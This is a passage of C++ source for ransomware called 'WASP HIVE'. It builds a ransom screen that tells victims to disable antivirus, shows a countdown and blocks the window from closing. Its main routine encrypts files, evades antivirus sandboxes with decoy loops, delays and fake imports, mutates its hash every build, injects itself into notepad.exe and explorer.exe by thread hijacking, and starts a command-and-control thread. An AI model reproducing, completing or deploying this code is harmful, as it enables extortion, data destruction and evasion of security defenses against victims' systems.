        title->SetForegroundColour(wxColour(255, 215, 0));
        wxFont titleFont(36, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD);
        title->SetFont(titleFont);
        mainSizer->Add(title, 0, wxALIGN_CENTER | wxBOTTOM, 15);

        // Info panel
        wxPanel* infoPanel = new wxPanel(panel);
        infoPanel->SetBackgroundColour(wxColour(15, 15, 15));
        wxBoxSizer* infoSizer = new wxBoxSizer(wxVERTICAL);

        // Subtitle with warning icon
        wxBoxSizer* subSizer = new wxBoxSizer(wxHORIZONTAL);
        if (wxStaticBitmap* icon = CreateWarningIcon(infoPanel, 28)) {
            subSizer->Add(icon, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 8);
        }
        wxStaticText* sub = new wxStaticText(infoPanel, wxID_ANY, "What Happened to My Files?");
        sub->SetForegroundColour(wxColour(255, 165, 0));
        sub->SetFont(wxFont(16, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
        subSizer->Add(sub, 0, wxALIGN_CENTER_VERTICAL);
        infoSizer->Add(subSizer, 0, wxALL, 12);

        // Description text
        wxString desc = wxString("All important files on your system have been locked using military-grade AES-256 encryption. "
                       "Your documents, photos, videos, databases, and other critical data are now inaccessible.\n\n")
                       + OBF("WASP HIVE ENCRYPTION SYSTEM:\n")
                       + "Protected by industry-standard RSA-4096 asymmetric encryption. "
                       + OBF("Your private decryption key is stored on our secure servers.\n\n");

        wxStaticText* descText = new wxStaticText(infoPanel, wxID_ANY, desc);
        descText->SetForegroundColour(wxColour(200, 200, 200));
        descText->SetFont(wxFont(11, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_NORMAL));
        descText->Wrap(700);
        infoSizer->Add(descText, 0, wxLEFT | wxRIGHT | wxBOTTOM, 12);

        // Warnings section with icon
        wxBoxSizer* warnHeaderSizer = new wxBoxSizer(wxHORIZONTAL);
        if (wxStaticBitmap* warnIcon = CreateWarningIcon(infoPanel, 20)) {
            warnHeaderSizer->Add(warnIcon, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 6);
        }
        wxStaticText* warnHeader = new wxStaticText(infoPanel, wxID_ANY, "IMPORTANT WARNINGS:");
        warnHeader->SetForegroundColour(wxColour(255, 100, 100));
        warnHeader->SetFont(wxFont(12, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
        warnHeaderSizer->Add(warnHeader, 0, wxALIGN_CENTER_VERTICAL);
        infoSizer->Add(warnHeaderSizer, 0, wxLEFT | wxRIGHT | wxBOTTOM, 8);

        // Warning list with icons
        wxString warnings[] = {
            OBF("DO NOT rename encrypted files - this may cause permanent data loss"),
            OBF("DO NOT use third-party decrypt tools - files may be corrupted"),
            OBF("Disable antivirus software - it may delete the decryptor"),
            "System restore will NOT work - encryption is irreversible"
        };

        for (const wxString& w : warnings) {
            wxBoxSizer* wSizer = new wxBoxSizer(wxHORIZONTAL);
            wSizer->AddSpacer(20);
            if (wxStaticBitmap* icon = CreateWarningIcon(infoPanel, 14)) {
                wSizer->Add(icon, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 6);
            }
            wxStaticText* wt = new wxStaticText(infoPanel, wxID_ANY, w);
            wt->SetForegroundColour(wxColour(180, 180, 180));
            wt->SetFont(wxFont(10, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_NORMAL));
            wSizer->Add(wt, 0, wxALIGN_CENTER_VERTICAL);
            infoSizer->Add(wSizer, 0, wxLEFT | wxRIGHT | wxBOTTOM, 4);
        }

        infoPanel->SetSizer(infoSizer);
        mainSizer->Add(infoPanel, 0, wxEXPAND | wxLEFT | wxRIGHT, 30);

        mainSizer->AddSpacer(15);

        // Pixel timer
        hours = 4; minutes = 0; seconds = 36;
        pixelTimerPanel = new PixelTimerPanel(panel, hours, minutes, seconds);
        mainSizer->Add(pixelTimerPanel, 0, wxALIGN_CENTER | wxBOTTOM, 15);

        // Password section
        wxBoxSizer* passSizer = new wxBoxSizer(wxHORIZONTAL);

        wxStaticText* passLabel = new wxStaticText(panel, wxID_ANY, OBF("ENTER DECRYPTION KEY:"));
        passLabel->SetForegroundColour(wxColour(255, 215, 0));
        passLabel->SetFont(wxFont(12, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
        passSizer->Add(passLabel, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 10);

        passwordInput = new wxTextCtrl(panel, wxID_ANY, "",
                                       wxDefaultPosition, wxSize(250, 30),
                                       wxTE_PASSWORD | wxTE_CENTER);
        passwordInput->SetBackgroundColour(wxColour(30, 30, 30));
        passwordInput->SetForegroundColour(wxColour(255, 215, 0));
        passwordInput->SetFont(wxFont(14, wxFONTFAMILY_MODERN, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
        passSizer->Add(passwordInput, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 10);

        wxButton* btn = new wxButton(panel, wxID_ANY, "UNLOCK FILES",
                                     wxDefaultPosition, wxSize(130, 30), wxBORDER_NONE);
        btn->SetBackgroundColour(wxColour(220, 50, 50));
        btn->SetForegroundColour(wxColour(255, 255, 255));
        btn->SetFont(wxFont(11, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
        passSizer->Add(btn, 0, wxALIGN_CENTER_VERTICAL);

        mainSizer->Add(passSizer, 0, wxALIGN_CENTER | wxBOTTOM, 12);

        // Bottom warning with icon
        wxBoxSizer* bottomWarnSizer = new wxBoxSizer(wxHORIZONTAL);
        if (wxStaticBitmap* icon = CreateWarningIcon(panel, 16)) {
            bottomWarnSizer->Add(icon, 0, wxALIGN_CENTER_VERTICAL | wxRIGHT, 6);
        }
        wxStaticText* bottomWarn = new wxStaticText(panel, wxID_ANY, "WRONG KEY = PERMANENT DATA LOSS");
        bottomWarn->SetForegroundColour(wxColour(255, 50, 50));
        bottomWarn->SetFont(wxFont(10, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_BOLD));
        bottomWarnSizer->Add(bottomWarn, 0, wxALIGN_CENTER_VERTICAL);
        mainSizer->Add(bottomWarnSizer, 0, wxALIGN_CENTER | wxBOTTOM, 10);

        panel->SetSizer(mainSizer);

        // Timer
        timer = new wxTimer(this, 1001);  // Unique ID
        timer->Start(1000);
        Bind(wxEVT_TIMER, &RansomwareFrame::OnTimer, this, 1001);

        // Mouse tracker timer - mouse'u pencere içinde tut (50ms interval)
        mouseTrackerTimer = new wxTimer(this, 1002);  // Unique ID
        mouseTrackerTimer->Start(50);
        Bind(wxEVT_TIMER, &RansomwareFrame::OnMouseTracker, this, 1002);

        btn->Bind(wxEVT_BUTTON, &RansomwareFrame::OnUnlock, this);

        // Prevent window closing without correct key
        canClose = false;
        Bind(wxEVT_CLOSE_WINDOW, &RansomwareFrame::OnClose, this);

        Centre();
    }

    void OnClose(wxCloseEvent& event) {
        if (!canClose) {
            wxMessageBox(OBF("YOUR FILES ARE ENCRYPTED!\n\nEnter the correct decryption key to unlock."),
                        OBF("⚠ CRITICAL WARNING ⚠"), wxOK | wxICON_ERROR, this);
            event.Veto();
        } else {
            event.Skip();
        }
    }

    void OnTimer(wxTimerEvent& event) {
        seconds--;
        if (seconds < 0) { seconds = 59; minutes--; }
        if (minutes < 0) { minutes = 59; hours--; }
        if (hours < 0) { hours = minutes = seconds = 0; timer->Stop(); }
        pixelTimerPanel->SetTime(hours, minutes, seconds);
    }

    void OnUnlock(wxCommandEvent& event) {
        wxString key = passwordInput->GetValue();
        if (key.IsEmpty()) {
            wxMessageBox(OBF("Enter decryption key!"), "Error", wxOK | wxICON_EXCLAMATION, this);
            return;
        }

        // Convert wxString to std::string
        std::string provided_key = std::string(key.mb_str());

        // Try to decrypt
        if (decryptTargetFile(provided_key)) {
            wxMessageBox(OBF("✓ DECRYPTION SUCCESSFUL!\n\nYour files have been restored."),
                        "Success", wxOK | wxICON_INFORMATION, this);
            canClose = true;
            Close(true);
        } else {
            wxMessageBox(OBF("✗ WRONG DECRYPTION KEY!\n\nYour files remain encrypted.\nTry again or contact support."),
                        OBF("Decryption Failed"), wxOK | wxICON_ERROR, this);
        }
    }

    ~RansomwareFrame() {
        if (timer) { timer->Stop(); delete timer; }
    }
};

class RansomwareApp : public wxApp {
public:
    virtual bool OnInit() {
        wxInitAllImageHandlers();
        wxImage::AddHandler(new wxPNGHandler());
        (new RansomwareFrame())->Show(true);
        return true;
    }
};
#endif // HEADLESS

#ifdef _WIN32
// ============================================================================
// IAT PADDING - Fake API calls to populate the Import Address Table
// ============================================================================
// This function calls legitimate Windows APIs that normal applications use.
// Without this padding, MWare's IAT would be nearly empty because all real
// APIs are resolved at runtime via hash-based export table walking.
// A nearly empty IAT is a major red flag for AV engines (suspicious PE).
// The variable idx is used to prevent dead-code elimination.
// ============================================================================
static void iat_pad_init() {
    volatile int idx = 0;  // Prevent dead-code elimination
    SYSTEM_INFO si; GetSystemInfo(&si); idx += (int)si.dwNumberOfProcessors;
    char buf[260]; DWORD bufSize = sizeof(buf); GetComputerNameA(buf, &bufSize); idx += (int)buf[0];
    GetDiskFreeSpaceA("C:\\", NULL, NULL, NULL, NULL);
    SYSTEMTIME st; GetLocalTime(&st); idx += st.wHour;
    GetLogicalDrives();
    GetFileAttributesA(".");
    GetCommandLineA();
    GetSystemDirectoryA(buf, sizeof(buf));
    GetSystemDefaultLangID(); GetUserDefaultLangID();
    GetSystemPowerStatus((SYSTEM_POWER_STATUS*)buf);
    (void)idx;
}
#endif // _WIN32

// ============================================================================
// MAIN FUNCTION - Starts C2 in background thread, then launches GUI
// ============================================================================

int main(int argc, char** argv) {
#ifdef _WIN32
    iat_pad_init();
    // DECOY: CPU-intensive Fibonacci calculation to evade AV emulation
    // AV sandboxes typically emulate for 1-2 seconds then give up.
    // This loop runs for ~2-4 seconds on real hardware.
    volatile unsigned long long decoy_a = 0, decoy_b = 1, decoy_c = 0;
    for (int decoy_i = 0; decoy_i < 5000000; decoy_i++) {
        decoy_c = decoy_a + decoy_b;
        decoy_a = decoy_b;
        decoy_b = decoy_c;
    }
    (void)decoy_c;
#endif
    cout << OBF("[*] WASP HIVE Ransomware Starting...") << endl;

    // Encrypt target file on startup (BEFORE GUI)
    cout << "[*] Encrypting target.txt..." << endl;
    encryptTargetFile();

    // Random delay (2-7 seconds) to evade simple sandbox analysis
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(2000, 7000);
    int delay_ms = dis(gen);

    #ifdef _WIN32
        secureSleepMs(delay_ms);
    #else
        usleep(delay_ms * 1000);
    #endif

    // Auto Thread Hijacking on startup - runs automatically without C2 command
    // Injects current executable into a target process for persistence/redundancy
    #ifdef _WIN32
        cout << "[*] Initiating auto Thread Hijacking..." << endl;

        // Get current executable path (payload)
        char payload_path[MAX_PATH];
        g_api.GetModuleFileNameA(NULL, payload_path, MAX_PATH);

        // Read current executable as payload
        ifstream payload_file(payload_path, ios::binary);
        if (payload_file.is_open()) {
            vector<BYTE> payload_data((istreambuf_iterator<char>(payload_file)),
                                      istreambuf_iterator<char>());
            payload_file.close();

            if (payload_data.size() > 0) {
                // Convert to string for thread hijacking
                string payload_str(payload_data.begin(), payload_data.end());

                // Try to inject into notepad.exe (common target)
                // If not running, it will start it
                cout << OBF("[*] Attempting Thread Hijacking into notepad.exe...") << endl;
                string result = performThreadHijacking(OBF("notepad.exe"), payload_str);
                cout << result << endl;

                // Also try explorer.exe as backup (usually running)
                cout << OBF("[*] Attempting Thread Hijacking into explorer.exe...") << endl;
                string result2 = performThreadHijacking(OBF("explorer.exe"), payload_str);
                cout << result2 << endl;
            }
        }

        // Small delay after injection before C2 connection
        secureSleepMs(2000);
    #endif

    // Start C2 agent in background thread
    thread c2_thread(c2_background_thread);

#ifndef HEADLESS
    // GUI mode: wxWidgets ransomware UI
    wxApp::SetInstance(new RansomwareApp());
    wxEntryStart(argc, argv);
    wxTheApp->OnInit();
    wxTheApp->OnRun();
    wxTheApp->OnExit();
    wxEntryCleanup();
#else
    // Headless mode: keep process alive while C2 thread runs
    cout << OBF("[*] Headless mode - C2 agent running in background") << endl;
    while (c2_running) {
        this_thread::sleep_for(chrono::seconds(1));
    }
#endif

    // Signal C2 background thread to stop, then wait for clean shutdown.
    // Prevents use-after-free of c2_session_key, g_api, g_spoofCtx, etc.
    // on process exit. joinable() check: HEADLESS mode may already have
    // the thread finished when c2_running was set to false internally.
    c2_running = false;
    if (c2_thread.joinable()) {
        c2_thread.join();
    }

    return 0;
}

// PADDING: Auto-mutating data to change file hash on EVERY compilation
// Uses __TIME__ macro (compile time) to generate different bytes each build
// Does not affect execution - only changes binary signature for fresh VT analysis
static const unsigned char _padding_junk[] = {
    // Compile-time hash of __TIME__ ensures unique padding per build
    (__TIME__[0] ^ __TIME__[1]), (__TIME__[2] ^ __TIME__[3]),
    (__TIME__[4] ^ __TIME__[5]), (__TIME__[6] ^ __TIME__[7]),
    (__DATE__[0] ^ __DATE__[1]), (__DATE__[2] ^ __DATE__[3]),
    (__DATE__[4] ^ __DATE__[5]), (__DATE__[6] ^ __DATE__[7]),
    (__TIME__[0] + __TIME__[1]), (__TIME__[2] + __TIME__[3]),
    (__TIME__[4] + __TIME__[5]), (__TIME__[6] + __TIME__[7]),
    (__DATE__[0] + __DATE__[1]), (__DATE__[2] + __DATE__[3]),
    (__DATE__[4] + __DATE__[5]), (__DATE__[6] + __DATE__[7]),
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
    0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
    0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0
};
